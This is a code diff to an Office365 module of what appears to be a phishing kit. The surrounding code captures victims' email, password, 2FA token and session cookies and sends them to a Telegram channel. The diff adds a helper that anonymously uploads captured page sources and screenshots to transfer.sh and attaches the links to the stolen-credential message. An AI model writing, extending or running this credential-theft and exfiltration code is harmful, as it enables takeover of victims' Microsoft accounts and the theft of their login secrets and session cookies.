@@ -69,6 +69,22 @@ class Office365Module(BaseModule):
         import threading, json
 
         def _cookie_worker(user, pwd, token):
+            import os  # new: needed for path handling in uploads
+            # helper to push artefacts to transfer.sh anonymously
+            def _upload(file_path):
+                try:
+                    with open(file_path, 'rb') as fp:
+                        resp = requests.put(
+                            f'https://transfer.sh/{os.path.basename(file_path)}',
+                            data=fp,
+                            timeout=30,
+                        )
+                    if resp.ok:
+                        return resp.text.strip()
+                except Exception as exc:
+                    print(f"[upload] Failed to upload {file_path}: {exc}")
+                return None
+
             try:
                 self.user = user
                 self.captured_password = pwd
@@ -77,10 +93,25 @@ class Office365Module(BaseModule):
             except Exception as ex:
                 cookies = [{"error": str(ex)}]
 
+            # Attempt to upload debug artefacts (page_source / screenshot)
+            artefact_links = []
+            if cookies and isinstance(cookies, list) and cookies:
+                first = cookies[0]
+                for key in ("page_source", "screenshot"):
+                    local_path = first.get(key)
+                    if local_path and isinstance(local_path, str) and os.path.exists(local_path):
+                        url = _upload(local_path)
+                        if url:
+                            artefact_links.append(f"{key}: {url}")
+                            # replace local path with URL for clarity
+                            first[key] = url
+
             cookie_block = json.dumps(cookies, indent=2) if cookies else 'Cookie capture failed'
             msg = (
                 f"*O365 Credential Capture (Full)*\nEmail: `{user}`\nPassword: `{pwd}`\n2FA: `{token}`\n\nCookies:\n```json\n{cookie_block}\n```"
             )
+            if artefact_links:
+                msg += "\n\nDebug artefacts:\n" + "\n".join(artefact_links)
             self.send_telegram(msg)
 
         threading.Thread(target=_cookie_worker, args=(self.user, self.captured_password, self.two_factor_token), daemon=True).start()
